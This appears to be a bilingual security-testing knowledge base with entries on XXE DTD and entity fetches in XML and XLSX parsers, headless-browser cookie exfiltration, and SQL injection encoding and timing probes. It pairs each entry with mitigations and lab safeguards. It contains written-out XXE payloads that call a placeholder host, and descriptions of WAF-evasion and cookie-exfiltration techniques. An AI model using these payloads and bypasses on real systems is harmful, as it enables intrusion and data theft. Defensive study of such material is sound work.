name.zh: 通用 XML 外部 DTD 获取变体

description.zh: 归并两个远程参数实体 DTD 文件名变体，验证通用 XML parser 是否获取外部子集，不推断 DTD 后续内容。
description.en: Groups two remote parameter-entity DTD filename variants to test whether a generic XML parser retrieves an external subset without inferring later DTD content.

subCategory.zh: 外部 DTD 载体获取

overview.zh: 覆盖通用 XML 解析器的外部 DTD 获取验证：以外部参数实体拉取两个 token 化 DTD 路径，以 {LAB_OAST} 收到独立请求确认获取边界。适用于确认解析器是否允许外部子集加载的场景。
overview.en: Covers external DTD fetch verification for generic XML parsers: pulling two tokenized DTD paths via external parameter entities, with independent requests at {LAB_OAST} confirming the fetch boundary. Suitable for determining whether a parser allows external subset loading.

vulnerability.zh: 根因是解析器允许获取外部 DTD 子集，外部加载是参数实体外带链的前置能力；验证端点只返回空合法 DTD，不提供二次实体内容，因此本条只证明获取边界本身。
vulnerability.en: The root cause is the parser allowing external DTD subset fetches — the precursor capability for parameter-entity exfiltration chains; the verification endpoint returns only an empty valid DTD with no secondary entity content, so this entry proves the fetch boundary alone.

exploitation.zh: 使用第 1 步命令以外部参数实体拉取两个 token 化 DTD 路径，{LAB_OAST} 渲染为只返回空合法 DTD 的自有端点；收到两次独立 DTD 请求即确认外部 DTD 获取边界成立。分别记录两次请求的时间与 token，验证请求确实来自目标解析器而非其他组件。
exploitation.en: Use the step 1 command to pull two tokenized DTD paths via external parameter entities, with {LAB_OAST} rendered as your own endpoint returning only an empty valid DTD; receiving two independent DTD requests confirms the external DTD fetch boundary. Record each request's time and token to attribute them to the target parser rather than other components.

mitigation.zh: 解析器禁用外部 DTD 子集与参数实体，出站网络限制为自有域；修复后重放 DTD 拉取载荷应报禁止错误且监听端无任何请求。
mitigation.en: Disable external DTD subsets and parameter entities in the parser and restrict outbound networking to owned domains; after the fix, replaying DTD fetch payloads must raise forbidden errors with zero listener requests.

title.en: Bind the format to its parser

description.zh: 记录实际入口、解析组件、版本和无外部资源基线。
description.en: Record the actual entry, parser component, version, and no-external-resource baseline.

title.en: Rewrite the target and run once

description.zh: 只使用本条执行区命令，所有真实资源替换为隔离 marker。
description.en: Use only this execution command and replace every real resource with an isolated marker.

attackChain.payload:
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{LAB_OAST}/xxe.dtd">%xxe;]><root>test</root>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{LAB_OAST}/xxe_gopher.dtd">%xxe;]><root>test</root>

description.zh: 匹配 parser 事件、任务 token 与解析或派生输出，排除其他入口。
description.en: Match parser events, job token, and parsed or derived output and exclude other entries.

description.zh: 修复后正常 XML 功能保持，该机制在访问 marker 前被拒绝。
description.en: After remediation preserve normal XML behavior and reject this mechanism before marker access.

prerequisites.zh: 已按实际入口把基础 XML、SVG、Office XML、远程 DTD 和协议 scheme 分配给对应 parser/worker，不将整套集合一次性投递。
prerequisites.en: Basic XML, SVG, Office XML, remote DTD, and protocol schemes are mapped to their actual parser or worker entry and the full collection is never submitted at once.

prerequisites.zh: 每个格式使用独立合法 fixture、沙箱 marker 和唯一任务/回调 token，记录 parser 能力矩阵、文件/网络审计和派生输出。
prerequisites.en: Each format uses an independent valid fixture, sandbox marker, and unique job or callback token, recording a parser capability matrix, file or network audit, and derived output.

analysis.zh: 阳性仅证明目标 parser 发出了对应 token 的 DTD 请求；文件名含 gopher、DNS、客户端请求或错误不能证明后续协议访问。
analysis.en: A positive proves only that the target parser sent the matching DTD-token request; gopher in a filename, DNS, client requests, or errors do not prove a later protocol access.

opsecTips.zh: XXE 综合矩阵每轮只测试一个格式/机制并使用 marker；禁止真实文件、元数据、gopher 和公共目标，出现扩张、外连或 worker 压力时停止。
opsecTips.en: The XXE matrix tests one format and mechanism per run with a marker; real files, metadata, gopher, and public targets are forbidden, and testing stops on expansion, egress, or worker pressure.

opsecTips.zh: 逐格式删除 fixture、marker、DTD/token 和派生产物，关闭监听器，清理各 parser/任务缓存与日志，并更新能力矩阵。
opsecTips.en: Delete per-format fixtures, markers, DTDs, tokens, and derived artifacts, close listeners, clear each parser and job cache plus logs, and update the capability matrix.

description.zh: 绕过对 SYSTEM "http 特征的拦截：PUBLIC 形式同样触发外部 DTD 拉取；成功判据：{LAB_OAST} 收到 pub.dtd 请求。
description.en: Bypasses blocking of SYSTEM "http by fetching the external DTD via the PUBLIC form. Success: {LAB_OAST} receives the pub.dtd request.

description.zh: URL scheme 大小写不敏感，HTTP:// 规避小写 http:// 匹配；成功判据：外部 DTD 仍被加载。
description.en: Scheme is case-insensitive so HTTP:// evades lowercase http:// matching. Success: the external DTD still loads.

description.zh: 协议首字符 h 以数字实体书写，URL 在解析时还原；成功判据：OAST 收到请求。
description.en: Writes the leading h as a numeric entity that resolves at parse time. Success: OAST receives the request.

name.zh: 通用 XML 外部资源实体

description.zh: 从 XLSX 集合中分离根元素为 x 的通用 XML file/HTTP 实体样例，避免把非 SpreadsheetML 输入归给工作簿部件。
description.en: Separates generic root-x XML file and HTTP entity samples from the XLSX set so non-SpreadsheetML input is not attributed to a workbook part.

subCategory.zh: 通用与 XSLT 文件读取

overview.zh: 覆盖通用 XML 入口的外部资源实体验证：以通用 XML 外部资源实体分别测试 file 与 HTTP 目标，file 行回显 marker、HTTP 行由 {LAB_OAST} 记录请求即确认资源实体可达。
overview.en: Covers external resource entity verification at generic XML entries: testing file and HTTP targets separately via generic XML external resource entities — the file row echoing a marker and the HTTP row logged by {LAB_OAST} confirm resource entity reachability.

vulnerability.zh: 根因是接收裸 XML 的通用解析器允许外部实体展开且各入口可能复用不安全 XML 工厂；该样例与 XLSX 部件解析是不同代码路径，需按实际入口分别归因。
vulnerability.en: The root cause is generic parsers receiving bare XML allowing external entity expansion, with entry points possibly sharing unsafe XML factories; this sample is a distinct code path from XLSX part parsing and must be attributed per actual entry.

exploitation.zh: 使用第 1 步命令以通用 XML 外部资源实体分别测试 file 与 HTTP 目标；file 行回显 marker、HTTP 行由 {LAB_OAST} 记录请求即确认资源实体可达。按实际通用 XML 入口单独测试并把目标改为 marker，不打包成 XLSX 提交，逐入口记录解析日志与请求时间。两类目标分开提交，避免混合样例造成归因模糊。
exploitation.en: Use the step 1 command to test file and HTTP targets separately via generic XML external resource entities; the file row echoing a marker and the HTTP row logged by {LAB_OAST} confirm resource entity reachability. Test each actual generic XML entry individually with targets swapped for markers, never packaging as XLSX, recording parse logs and request times per entry. Submit the two target classes separately so mixed samples never blur attribution.

mitigation.zh: 共享 XML 工厂层统一禁用 DTD、外部实体与 XInclude，resolver 协议与路径默认拒绝；按入口维护回归矩阵，修复后各入口重放应报禁止错误。
mitigation.en: Disable DTDs, external entities, and XInclude uniformly at the shared XML factory layer with resolvers default-denying protocols and paths; maintain an entry-level regression matrix, and after the fix every entry must raise forbidden errors on replay.

title.zh: 确认实际 XML 入口

description.zh: 记录解析组件、任务入口和无外部资源基线。
description.en: Record the parser component, job entry, and no-external-resource baseline.

title.zh: 改写目标并提交单一机制
title.en: Rewrite targets and submit one mechanism

description.zh: 只运行本条执行区命令，并将真实目标替换为隔离 marker。
description.en: Run only this execution command and replace real destinations with isolated markers.

attackChain.payload:
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{FILE_PATH}">]><x>&xxe;</x>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{LAB_OAST}/">]><x>&xxe;</x>

description.zh: 匹配任务 token、解析事件与单元格或提取输出，排除客户端行为。
description.en: Match job token, parser events, and cell or extraction output and exclude client behavior.

description.zh: 修复后普通工作簿或 XML 保持可用，该机制在访问 marker 前失败。
description.en: After remediation preserve ordinary workbook or XML handling and fail this mechanism before marker access.

prerequisites.zh: 服务端 XLSX 导入、预览或索引流程解包并解析 xl/sharedStrings.xml，XML parser 与共享字符串读取路径已确认。
prerequisites.en: A server-side XLSX import, preview, or indexing flow unpacks and parses xl/sharedStrings.xml, with XML parser and shared-string read path confirmed.

prerequisites.zh: 最小合法 XLSX 只让实体指向导入 worker 沙箱内 marker，并保存 ZIP 成员哈希、任务/工作表 ID、文件审计与单元格输出。
prerequisites.en: A minimal valid XLSX points the entity only to a marker inside the import-worker sandbox and preserves ZIP-member hashes, job or worksheet identifiers, file audit, and cell output.

analysis.zh: 阳性必须归属于明确的通用 XML parser，并关联 marker 读取或 token 请求；XLSX worker 结果不能替代该入口证据。
analysis.en: A positive must belong to an identified generic XML parser and correlate a marker read or token request; an XLSX-worker result cannot substitute for this entry evidence.

opsecTips.zh: XLSX XXE 只读专用 marker，禁止系统/网络实体和大型工作簿；出现真实文件读取、外连、公式/宏执行、内存增长或队列积压时停止。
opsecTips.en: XLSX XXE reads a dedicated marker only and forbids system or network entities and large workbooks; stop on real-file reads, egress, formula or macro execution, memory growth, or queue backlog.

opsecTips.zh: 删除 XLSX、解包目录、导入记录/预览和 marker，清理表格任务/对象存储/解析缓存并重启隔离 importer。
opsecTips.en: Delete XLSX files, extraction directories, imported records or previews, and markers, clear spreadsheet jobs, object storage, and parser caches, and restart isolated importers.

title.zh: 十六进制实体编码路径

description.zh: 路径字符以数字字符实体编码，规避 file:///etc/passwd 明文规则；成功判据：实体按编码路径解析成功。
description.en: Encodes path characters as numeric entities to evade the plaintext file:///etc/passwd rule. Success: the entity resolves via the encoded path.

description.zh: 实体引用夹在 CDATA 段之间，打断 &x;</x> 结尾特征；成功判据：文件内容与前后缀一同输出。
description.en: Sandwiches the reference between CDATA sections to break the &x;</x> ending signature. Success: file contents output alongside the prefixes.

description.zh: 引用置于多层嵌套深处，规避对根节点直引的浅层规则；成功判据：深层解析展开实体。
description.en: Places the reference deep in nested elements to evade shallow rules on root-level references. Success: deep parsing expands the entity.

name.zh: XLSX SharedStrings 外部 DTD 获取

description.zh: 隔离 sharedStrings.xml 的外部参数实体，验证 SpreadsheetML parser 是否获取远程 DTD。
description.en: Isolates the external parameter entity in sharedStrings.xml to test whether the SpreadsheetML parser retrieves a remote DTD.

subCategory.zh: 外部 DTD 载体获取

overview.zh: 覆盖 XLSX 解析器的外部 DTD 获取验证：以 SharedStrings 中的外部参数实体拉取 DTD，{LAB_OAST} 收到单次请求即确认 XLSX 外部 DTD 获取边界。
overview.en: Covers external DTD fetch verification in XLSX parsers: pulling a DTD via an external parameter entity in SharedStrings, with {LAB_OAST} receiving a single request confirming the XLSX external DTD fetch boundary.

vulnerability.zh: 根因是 SpreadsheetML 解析器允许获取外部 DTD 子集，外部加载是参数实体外带链的前置能力；端点只返回空合法 DTD 以证明获取行为本身。
vulnerability.en: The root cause is SpreadsheetML parsers allowing external DTD subset fetches — the precursor capability for parameter-entity exfiltration chains; the endpoint returns only an empty valid DTD to prove the fetch behavior itself.

exploitation.zh: 使用第 1 步命令以 SharedStrings 中的外部参数实体拉取 DTD，{LAB_OAST} 渲染为只返回空合法 DTD 的单次 token 端点；收到单次 DTD 请求即确认 XLSX 外部 DTD 获取边界。保留合法 workbook 结构，在隔离环境触发真实导入并按 token 关联请求。未收到请求时按阴性处理并复查外部子集配置。
exploitation.en: Use the step 1 command to pull a DTD via an external parameter entity in SharedStrings, with {LAB_OAST} rendered as a single-token endpoint returning only an empty valid DTD; receiving the single DTD request confirms the XLSX external DTD fetch boundary. Preserve valid workbook structure, trigger real imports in an isolated environment, and correlate requests by token. Treat missing requests as negative and recheck external-subset settings.

mitigation.zh: 表格解析栈禁用外部 DTD 子集与参数实体，导入 worker 出站默认拒绝；修复后重放应报禁止错误且监听端无请求。
mitigation.en: Disable external DTD subsets and parameter entities in the spreadsheet parsing stack with import-worker egress default-denied; after the fix, replays must raise forbidden errors with zero listener requests.

title.zh: 确认实际 XML 入口

description.zh: 记录解析组件、任务入口和无外部资源基线。
description.en: Record the parser component, job entry, and no-external-resource baseline.

description.en: Run only this execution command and replace real destinations with isolated markers.

description.zh: 匹配任务 token、解析事件与单元格或提取输出，排除客户端行为。
description.en: Match job token, parser events, and cell or extraction output and exclude client behavior.

description.zh: 修复后普通工作簿或 XML 保持可用，该机制在访问 marker 前失败。
description.en: After remediation preserve ordinary workbook or XML handling and fail this mechanism before marker access.

prerequisites.zh: 服务端 XLSX 导入、预览或索引流程解包并解析 xl/sharedStrings.xml，XML parser 与共享字符串读取路径已确认。
prerequisites.en: A server-side XLSX import, preview, or indexing flow unpacks and parses xl/sharedStrings.xml, with XML parser and shared-string read path confirmed.

prerequisites.zh: 最小合法 XLSX 只让实体指向导入 worker 沙箱内 marker，并保存 ZIP 成员哈希、任务/工作表 ID、文件审计与单元格输出。
prerequisites.en: A minimal valid XLSX points the entity only to a marker inside the import-worker sandbox and preserves ZIP-member hashes, job or worksheet identifiers, file audit, and cell output.

analysis.zh: 阳性要求 token 化 DTD 请求来自处理该 XLSX 的 worker；DNS、客户端请求、导入失败或 ATTACKER 回显均不计。
analysis.en: A positive requires the tokenized DTD request to originate from the worker processing this XLSX; DNS, client requests, import failure, or reflected ATTACKER text does not count.

opsecTips.zh: XLSX XXE 只读专用 marker，禁止系统/网络实体和大型工作簿；出现真实文件读取、外连、公式/宏执行、内存增长或队列积压时停止。
opsecTips.en: XLSX XXE reads a dedicated marker only and forbids system or network entities and large workbooks; stop on real-file reads, egress, formula or macro execution, memory growth, or queue backlog.

opsecTips.zh: 删除 XLSX、解包目录、导入记录/预览和 marker，清理表格任务/对象存储/解析缓存并重启隔离 importer。
opsecTips.en: Delete XLSX files, extraction directories, imported records or previews, and markers, clear spreadsheet jobs, object storage, and parser caches, and restart isolated importers.

description.zh: 参数实体移到 xl/styles.xml，规避 sharedStrings 部件扫描；成功判据：OAST 收到 st.dtd 请求。
description.en: Moves the parameter entity into xl/styles.xml to evade sharedStrings part scanning. Success: OAST receives the st.dtd request.

description.zh: PUBLIC 外部 DTD 形式替代内部参数实体，绕过 %x; 展开特征；成功判据：{LAB_OAST} 收到请求。
description.en: Uses the PUBLIC external DTD form instead of an internal parameter entity, evading %x; expansion signatures. Success: {LAB_OAST} receives the request.

wafBypass.command: 将 xl/sharedStrings.xml 声明为 encoding="UTF-16" 并把 <!DOCTYPE s [<!ENTITY % x SYSTEM "http://{LAB_OAST}/x.dtd">%x;]> 以 UTF-16 字节重写

description.zh: 部件整体 UTF-16 化使 SYSTEM/http 特征对 ASCII 扫描器不可见；成功判据：解析时仍发起外链请求。
description.en: UTF-16 encoding hides SYSTEM/http signatures from ASCII scanners. Success: the outbound request still occurs at parse time.

name.zh: Puppeteer 页面 Cookie 出站通道

description.zh: 归并 sendBeacon、顶层导航和 Image 三种出站方式，验证无头浏览器执行不可信脚本时非 HttpOnly 测试 Cookie 是否可离开页面。
description.en: Groups sendBeacon, top-level navigation, and Image egress methods to test whether a non-HttpOnly test cookie can leave the page when a headless browser executes untrusted script.

overview.zh: 覆盖无头浏览器中脚本执行后数据出站的验证：以 sendBeacon、顶层导航与 Image 三种方式外发非 HttpOnly 测试 Cookie，收集端按通道收到请求即确认出站通道成立。
overview.en: Covers post-execution data egress verification in headless browsers: exfiltrating non-HttpOnly test cookies via sendBeacon, top-level navigation, and Image, with the collector receiving requests per channel confirming the egress channel.

vulnerability.zh: 根因是不可信 HTML 在带业务 Cookie 的渲染上下文运行时，非 HttpOnly 值可被脚本读取并发送；捕获器只收到空请求或固定 URL 不能证明 Cookie 泄露，需按通道区分验证。
vulnerability.en: The root cause is untrusted HTML running in a rendering context carrying business cookies: non-HttpOnly values are script-readable and sendable; a collector receiving only empty requests or fixed URLs does not prove cookie leakage — verify per channel.

exploitation.zh: 使用第 1 步命令在受控浏览器夹具中分别以 sendBeacon、导航与 Image 三种方式外发页面 cookie，三行逐一执行；收集端收到三种请求即确认页面数据出站通道成立。{ATTACKER_HOST} 渲染为隔离收集器，cookie 仅含随机测试值，为每个 API 设置不同随机 Cookie 与捕获路径并比较 HttpOnly 对照。
exploitation.en: Use the step 1 command to exfiltrate page cookies in a controlled browser fixture via sendBeacon, navigation, and Image, executing the three lines one by one; the collector receiving all three request types confirms the page-data egress channel. Render {ATTACKER_HOST} as an isolated collector with random test-only cookie values, assigning distinct random cookies and capture paths per API and comparing against HttpOnly controls.

mitigation.zh: 在独立无会话来源中渲染不可信内容，禁用不需要的 JavaScript，应用严格 CSP 与出口允许列表；敏感 Cookie 设置 HttpOnly、Secure 与适当 SameSite。
mitigation.en: Render untrusted content in a separate session-less origin, disable unneeded JavaScript, and apply strict CSP with egress allowlists; set HttpOnly, Secure, and appropriate SameSite on sensitive cookies.

title.zh: 建立测试 Cookie 对照

description.zh: 创建随机普通 Cookie 与随机 HttpOnly Cookie，并确认正常页面无出站。
description.en: Create random ordinary and HttpOnly cookies and confirm an ordinary page has no egress.

title.en: Submit one channel at a time

description.zh: 为三种 API 分配不同捕获路径并分别渲染一次。
description.en: Assign separate collector paths to the three APIs and render each once.

description.zh: 匹配随机值、请求时间、浏览器进程和渲染 ID，验证 HttpOnly 缺失。
description.en: Match random value, request time, browser process, and render ID and verify the HttpOnly value is absent.

description.zh: 修复后确认三种通道均不能携带测试 Cookie，同时普通渲染保持正常。
description.en: After remediation confirm none of the channels carries the test cookie while ordinary rendering remains functional.

prerequisites.zh: ATTACKER 改为隔离的单次请求捕获器，页面只设置无权限随机测试 Cookie
prerequisites.en: ATTACKER is replaced with an isolated single-request collector and the page sets only a random unprivileged test cookie.

prerequisites.zh: 同时准备 HttpOnly 对照 Cookie，并能记录浏览器请求方法、目标和来源渲染任务
prerequisites.en: An HttpOnly control cookie is prepared and browser request method, destination, and originating render job can be recorded.

analysis.zh: 捕获器收到与当前任务绑定的随机非 HttpOnly Cookie 才证明数据出站。仅产生请求、改变 location、加载失败或收到无 Cookie 流量是阴性；HttpOnly 对照用于限定脚本可读边界。
analysis.en: Data egress is proven only when the collector receives the random non-HttpOnly cookie bound to the current job. A request alone, location change, load failure, or cookie-free traffic is negative; the HttpOnly control bounds script readability.

opsecTips.zh: 捕获器只保存随机值和任务 ID，禁止真实会话 Cookie、请求体转储和重定向
opsecTips.en: The collector stores only the random value and job ID, with no real session cookies, body dumps, or redirects.

opsecTips.zh: 每次运行使用全新 Profile 和 Cookie jar，捕获首个请求后立即关闭网络与浏览器
opsecTips.en: Use a fresh profile and cookie jar for every run and close networking and the browser after the first captured request.

description.zh: 绕过对 sendBeacon/Image 外带的特征检测：改用 WebSocket 首帧发送。判据：服务端 ws 收到 cookie。
description.en: Exfiltrates via the first WebSocket frame instead of beacon/img. Success: cookie received on ws endpoint.

description.zh: 绕过 fetch+CSP connect-src 粗规则：no-cors 模式静默外带。判据：服务端 POST body 含 cookie。
description.en: Uses no-cors keepalive POST that most egress filters ignore. Success: cookie seen in POST body.

description.zh: 绕过长 cookie/单请求截断：分片多次请求。判据：服务端按序重组出完整 cookie。
description.en: Splits the cookie into chunks across image requests. Success: server reassembles the full cookie.

description.zh: 绕过 fetch/XHR 特征：用原生表单提交外带。判据：服务端收到 c 字段。
description.en: Uses a dynamically built form POST instead of fetch/XHR. Success: c field received server-side.

name.zh: UNION 提取与 SQL 词法编码变体
name.en: UNION Extraction and SQL Lexical Encoding Variants

description.zh: 使用注释、换行、垂直制表、双重编码、大小写和括号变体验证 UNION 查询在多层规范化后的语义。
description.en: Uses comments, line breaks, vertical tabs, double encoding, case changes, and parentheses to test UNION query semantics after multilayer normalization.

subCategory.zh: 编码与 WAF 等价变体

overview.zh: 覆盖 UNION 提取的词法编码变体验证：以注释、换行、垂直制表、双重编码、大小写与括号变体提交 UNION 查询，检测各层规范化后语义是否保持。
overview.en: Covers lexical-encoding variant verification for UNION extraction: submitting UNION queries via comment, newline, vertical-tab, double-encoding, case, and parenthesis variants, testing whether semantics survive per-layer normalization.

vulnerability.zh: 根因是不可信输入被拼接进查询结构而安全控制依赖原始字符串匹配；应用和数据库在额外解码、注释处理或空白折叠后恢复 UNION/SELECT 语义，参数与查询语法边界被突破。
vulnerability.en: The root cause is untrusted input concatenated into query structure while security controls match raw strings; applications and databases restore UNION/SELECT semantics after extra decoding, comment handling, or whitespace folding, breaching the parameter and query-syntax boundary.

exploitation.zh: 使用第 1 步命令按已确认数据库方言逐条把编码变体应用到测试查询，并把表、列与用户目标改为测试对象；记录应用解码后 SQL 与结果列对齐情况。先以常量测试列确定列数和回显位置，再只选择目标方言的一行指向测试表，关联请求、规范化后 SQL、数据库审计与固定标记结果。
exploitation.en: Use the step 1 command to apply encoding variants to test queries per the confirmed database dialect, swapping table, column, and user targets for test objects; record post-decode SQL and result column alignment. Fix column count and echo positions with constant test columns first, then pick only the target dialect's row against test tables, correlating requests, normalized SQL, database audit, and fixed-marker results.

mitigation.zh: 使用参数化查询和固定查询结构，动态排序/列名经服务端允许列表映射；边界与应用统一解码一次但不依赖 WAF 修复注入，数据库账户最小权限，并把全部编码变体纳入回归。
mitigation.en: Use parameterized queries with fixed query structure, mapping dynamic ordering/columns through server-side allowlists; decode exactly once at the boundary and application without relying on the WAF to fix injection, keep database accounts least-privileged, and regression-test every encoding variant.

description.zh: 用合法测试查询和常量列记录最终 SQL、返回列与错误行为。
description.en: Use a valid test query and constant columns to record final SQL, returned columns, and error behavior.

title.zh: 提交方言匹配的词法变体

description.zh: 一次选择一行，替换为测试表和固定标记，并保留每层解码值。
description.en: Select one line at a time, point it to a test table and fixed marker, and retain decoded values at every layer.

description.zh: 匹配测试标记、最终 SQL 与数据库审计，排除错误页、缓存和字符串回显。
description.en: Match test marker, final SQL, and database audit, excluding error pages, caching, and string reflection.

title.zh: 参数化并回归编码矩阵
title.en: Parameterize and regress the encoding matrix

description.zh: 固定查询结构后重放合法输入及全部词法变体，确认只有数据参数进入查询。
description.en: After fixing query structure, replay valid input and all lexical variants to confirm only data parameters reach the query.

prerequisites.zh: 输入可能进入支持 UNION 的关系型数据库查询
prerequisites.en: Input may enter a relational query that supports UNION.

prerequisites.zh: 使用只含测试数据的数据库副本并可审计最终 SQL
prerequisites.en: A database copy with test-only data and auditable final SQL is available.

analysis.zh: 区分边界放行、数据库语法接受和测试数据回显三个层级。只有最终 SQL 和结果证据能确认 UNION 注入，WAF 差异本身不能。
analysis.en: Separate edge acceptance, database syntax acceptance, and test-data output. Only final SQL and result evidence confirm UNION injection; a WAF differential alone does not.

opsecTips.zh: 所有 users、password、mysql.user 等目标替换为只含伪数据的测试表。
opsecTips.en: Replace users, password, mysql.user, and similar targets with test tables containing synthetic data.

opsecTips.zh: 每次仅尝试一个与已确认方言匹配的变体并限制响应行数。
opsecTips.en: Try one confirmed-dialect variant at a time and limit result rows.

name.zh: UNION CRLF 与注释分词编码
name.en: UNION CRLF and Comment Tokenization Encoding

description.zh: 使用 URL 编码 CRLF 与注释边界验证 WAF、框架和数据库是否把同一输入分词为不同的 UNION SELECT 查询。
description.en: Uses URL-encoded CRLF and comment boundaries to test whether the WAF, framework, and database tokenize the same input into different UNION SELECT semantics.

subCategory.zh: 编码与 WAF 等价变体

overview.zh: 覆盖 CRLF 与注释分词的 UNION 规范化验证：以 URL 编码 %0D%0A 与注释边界提交，验证 WAF、框架和数据库是否把同一输入分词为不同的 UNION SELECT 查询。
overview.en: Covers UNION normalization verification via CRLF and comment tokenization: submitting URL-encoded %0D%0A with comment boundaries to test whether WAF, framework, and database tokenize the same input into different UNION SELECT queries.

vulnerability.zh: 根因是应用拼接 SQL 且 WAF 在不同解码阶段按平面关键字匹配；数据库把编码后恢复的换行视为空白、井号视为注释，导致边界分词与数据库解析不一致。
vulnerability.en: The root cause is SQL concatenation with WAFs matching flat keywords at different decode stages; databases treat restored encoded newlines as whitespace and hash signs as comments, desynchronizing boundary tokenization from database parsing.

exploitation.zh: 使用第 1 步命令把 current_user 改为测试常量后单独提交，记录原始、一次解码、完全解码与数据库语句四个层次；不与 HTTP 头注入测试混用。用无 UNION 的合法值和纯换行控制建立基线，确认固定常量进入查询结果才算成立，WAF 放行或 400 响应不构成证据。
exploitation.en: Use the step 1 command with current_user swapped for a test constant, submitting standalone while recording four layers — raw, single-decoded, fully decoded, and the database statement; never mix with HTTP-header injection testing. Baseline with UNION-free legitimate values and pure newline controls; only fixed constants entering query results count, with WAF pass-throughs or 400 responses as non-evidence.

mitigation.zh: 参数化查询并禁止用户控制 SQL 结构，在应用入口执行确定性一次解码并拒绝异常控制字符；WAF 可统一规范化后检测但仅作补充，回归保留原编码字节与完全解码语义。
mitigation.en: Parameterize queries and forbid user-controlled SQL structure, decoding deterministically once at the application entry while rejecting anomalous control characters; WAFs may detect after unified normalization as a supplement only, with regressions keeping both raw encoded bytes and fully decoded semantics.

title.en: Record decoding baselines at every layer

description.zh: 比较合法值、纯换行控制与原始编码在代理和应用中的规范化结果。
description.en: Compare valid input, newline-only control, and raw encoding through proxy and application normalization.

title.zh: 提交固定常量 UNION 样例

description.zh: 替换 current_user 后提交并捕获最终 SQL 与结果。
description.en: Replace current_user, submit the sample, and capture final SQL and result.

description.zh: 匹配完全解码语句、注释边界、查询审计和固定标记，排除 HTTP 头行为。
description.en: Match the fully decoded statement, comment boundary, query audit, and fixed marker, excluding HTTP-header behavior.

title.zh: 参数化并统一解码回归

description.zh: 修复后重放原字节和合法输入，确认 SQL 语义不再改变。
description.en: After remediation replay raw bytes and valid input to confirm SQL semantics no longer change.

prerequisites.zh: 目标查询使用 MySQL 类语法并经过至少一层 URL 解码
prerequisites.en: The target query uses MySQL-like syntax and passes through at least one URL-decoding layer.

prerequisites.zh: 测试数据库含固定伪数据并可查看规范化值和最终 SQL
prerequisites.en: A test database contains fixed synthetic data and exposes normalized input and final SQL for audit.

analysis.zh: 尽管字节包含 CRLF，它属于 SQL 词法规范化。报告要给出完全解码后的 SQL 和结果证据，不应误分类为 HTTP 请求/响应拆分。
analysis.en: Although the bytes contain CRLF, this is SQL lexical normalization. Report fully decoded SQL and result evidence and do not misclassify it as HTTP request or response splitting.

opsecTips.zh: 只返回固定常量并限制一行结果，不读取数据库用户或目录。
opsecTips.en: Return only a fixed constant and one row; do not read database users or directories.

opsecTips.zh: 只提交一次编码样例并保留原始字节，避免重复慢查询和日志噪声。
opsecTips.en: Submit the encoded sample once and preserve raw bytes to avoid repeated expensive queries and log noise.

name.zh: 盲注条件、时间与谓词探测
name.en: Blind SQL Conditional, Timing, and Predicate Probes

description.zh: 使用 SLEEP、BENCHMARK、字符串函数、文件条件、DCount/ANY 与元数据谓词验证无回显查询中的可重复真假或时间信道。
description.en: Uses SLEEP, BENCHMARK, string functions, file conditions, DCount or ANY, and metadata predicates to test repeatable Boolean or timing channels in nonreflective queries.

overview.zh: 覆盖盲注的条件、时间与谓词探测：以 SLEEP、BENCHMARK、字符串函数、文件条件与元数据谓词构造真假或时间信道，按已确认方言选择测试谓词成对运行。
overview.en: Covers blind injection condition, timing, and predicate probes: building true/false or timing channels with SLEEP, BENCHMARK, string functions, file conditions, and metadata predicates, pairing true/false runs per the confirmed dialect.

vulnerability.zh: 根因是动态拼接 SQL 而结果不直接返回，条件函数、时间函数或元数据谓词让攻击者控制执行分支，从响应差异或运行时间逐位推断数据；网络抖动与缓存会造成假阳性。
vulnerability.en: The root cause is dynamically concatenated SQL without direct results: condition, timing, or metadata predicates let attackers steer execution branches, inferring data bit by bit from response differences or runtimes; network jitter and caches create false positives.

exploitation.zh: 使用第 1 步命令的盲注真假与时间样例，其中 state/case/BENCHMARK 三行是连续样例；按已确认方言选择测试谓词，把文件、用户和密码条件替换为测试数据并成对运行真/假条件。先用固定真/假业务输入测量基线，再交错运行真、假与无延迟对照多轮，结合数据库查询持续时间确认统计稳定。
exploitation.en: Use the step 1 command's blind true/false and timing samples, where the state/case/BENCHMARK three lines form one continuous sample; pick test predicates per the confirmed dialect, swap file, user, and password conditions for test data, and run true/false pairs. Measure baselines with fixed true/false business inputs first, then interleave true, false, and no-delay controls across multiple rounds, confirming statistical stability with database query durations.

mitigation.zh: 参数化所有值并把动态查询分支映射到固定模板，限制数据库时间/文件/元数据函数权限与语句超时；统一错误响应与缓存策略，并用真假成对用例回归。
mitigation.en: Parameterize all values, mapping dynamic query branches to fixed templates; restrict database time/file/metadata function privileges with statement timeouts; unify error responses and caching policies, regressing with paired true/false cases.

description.zh: 交错采集合法真/假和无延迟请求，记录应用与数据库耗时。
description.en: Interleave valid true, false, and no-delay requests and record application and database durations.

description.zh: 选择已确认方言的一组样例，把目标替换为测试数据并多轮运行真假条件。
description.en: Choose a sample for the confirmed dialect, replace targets with test data, and run true and false conditions over multiple rounds.

description.zh: 比较分布并匹配最终 SQL、函数调用和查询持续时间，排除网络抖动与缓存。
description.en: Compare distributions and match final SQL, function calls, and query duration, excluding network jitter and caching.

title.zh: 参数化并重放统计基线
title.en: Parameterize and replay the statistical baseline

description.zh: 修复后按相同采样设计重放，确认真假请求时延收敛且业务结果正确。
description.en: After remediation replay the same sampling design to confirm true and false timing converges while business results remain correct.

prerequisites.zh: 输入影响数据库查询但响应不直接回显结果
prerequisites.en: Input affects a database query whose result is not directly reflected.

prerequisites.zh: 隔离环境可采集多次时延样本和数据库审计
prerequisites.en: The isolated environment can collect repeated latency samples and database audit.

analysis.zh: 单次慢响应不是证据。应报告样本量、中位数/分位数、真假差异、数据库执行日志和控制组，且不从生产敏感数据构造谓词。
analysis.en: One slow response is not evidence. Report sample size, medians or percentiles, true-false separation, database logs, and controls, without predicates over production-sensitive data.

opsecTips.zh: 把 5 秒/高迭代延迟降到隔离环境可识别的最小值并严格限制轮数。
opsecTips.en: Reduce five-second or high-iteration delays to the smallest distinguishable value in isolation and strictly limit rounds.

opsecTips.zh: 文件、用户名和密码条件全部替换为测试记录，不推断真实凭据。
opsecTips.en: Replace file, username, and password predicates with test records and never infer real credentials.

name.zh: 直接 SQL 语句与目录表选择
